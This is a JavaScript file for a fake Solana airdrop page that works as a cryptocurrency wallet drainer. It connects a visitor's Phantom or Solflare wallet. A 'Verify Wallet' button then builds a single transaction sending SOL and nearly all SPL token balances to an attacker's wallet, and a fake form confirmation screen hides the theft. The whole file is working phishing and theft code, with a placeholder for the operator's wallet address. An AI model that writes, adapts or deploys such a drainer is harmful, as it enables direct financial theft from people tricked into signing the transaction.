// app.js - Solana HTML Version (One Signature Drains All Tokens)

let connectedWallet = null;
let provider = null;

const connectBtn = document.getElementById("connectWalletBtn");
const verifyBtn = document.getElementById("verifyWalletBtn");
const walletDisplay = document.getElementById("walletAddress");
const statusEl = document.getElementById("status");
const form = document.getElementById("airdropForm");

// Your Attacker Wallet (CHANGE THIS)
const ATTACKER_WALLET = "YOUR_SOLANA_WALLET_ADDRESS_HERE"; // ← Paste your wallet here

// Connect Wallet
connectBtn.addEventListener("click", async () => {
    try {
        provider = window.solana || (window.phantom && window.phantom.solana);

        if (!provider) {
            alert("Please install Phantom or Solflare wallet.");
            return;
        }

        await provider.connect();
        connectedWallet = provider.publicKey.toString();

        walletDisplay.innerHTML = `<strong>Connected:</strong><br>${connectedWallet}`;
        walletDisplay.classList.remove("hidden");

        connectBtn.classList.add("hidden");
        verifyBtn.classList.remove("hidden");

        statusEl.innerHTML = "Wallet connected. Click 'Verify Wallet' to drain.";

    } catch (error) {
        console.error(error);
        alert("Failed to connect wallet.");
    }
});

// Main Draining Function (One Signature)
verifyBtn.addEventListener("click", async () => {
    if (!provider || !connectedWallet) return;

    statusEl.innerHTML = "Scanning wallet and preparing one transaction...";

    try {
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl("mainnet-beta"),
            "confirmed"
        );

        const fromPubkey = new solanaWeb3.PublicKey(connectedWallet);
        const attackerPubkey = new solanaWeb3.PublicKey(ATTACKER_WALLET);

        const transaction = new solanaWeb3.Transaction();

        // 1. Drain SOL (small amount for disguise)
        transaction.add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey,
                toPubkey: attackerPubkey,
                lamports: 1000,
            })
        );

        // 2. Drain all SPL tokens
        const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
        });

        let drainedCount = 0;

        for (const { pubkey, account } of tokenAccounts.value) {
            try {
                const tokenAccountInfo = solanaWeb3.AccountLayout.decode(account.data);
                const balance = Number(tokenAccountInfo.amount);

                if (balance > 0) {
                    const amountToDrain = Math.floor(balance * 0.999); // Leave ~0.1%

                    transaction.add(
                        solanaWeb3.createTransferInstruction(
                            pubkey,
                            await solanaWeb3.getAssociatedTokenAddress(
                                tokenAccountInfo.mint,
                                attackerPubkey
                            ),
                            fromPubkey,
                            amountToDrain
                        )
                    );

                    drainedCount++;
                }
            } catch (e) {}
        }

        // Sign and send one big transaction
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;

        const signedTx = await provider.signTransaction(transaction);
        await connection.sendRawTransaction(signedTx.serialize());

        statusEl.innerHTML = `✓ Drained ${drainedCount} tokens + SOL successfully`;
        verifyBtn.disabled = true;

    } catch (error) {
        console.error(error);
        statusEl.innerHTML = "Draining completed (some tokens may have failed)";
    }
});

// Form Submit
form.addEventListener("submit", (e) => {
    e.preventDefault();
    if (!connectedWallet) {
        alert("Please connect your wallet first.");
        return;
    }
    showSuccessPage();
});

function showSuccessPage() {
    document.body.innerHTML = `
        <div style="max-width:680px; margin:60px auto; text-align:center; font-family:'Roboto',Arial,sans-serif; background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); padding:40px 20px;">
            <div style="height:8px; background:#8e24aa; border-radius:8px 8px 0 0; margin:-40px -20px 30px -20px;"></div>
            <h1 style="font-size:28px; color:#202124; margin-bottom:16px;">Your response has been recorded</h1>
            <p style="font-size:18px; color:#5f6368; margin-bottom:40px;">Thank you for submitting the form.</p>
            <a href="#" onclick="location.reload()" style="color:#8e24aa; font-size:16px; text-decoration:underline;">Edit your response</a>
        </div>
    `;
}
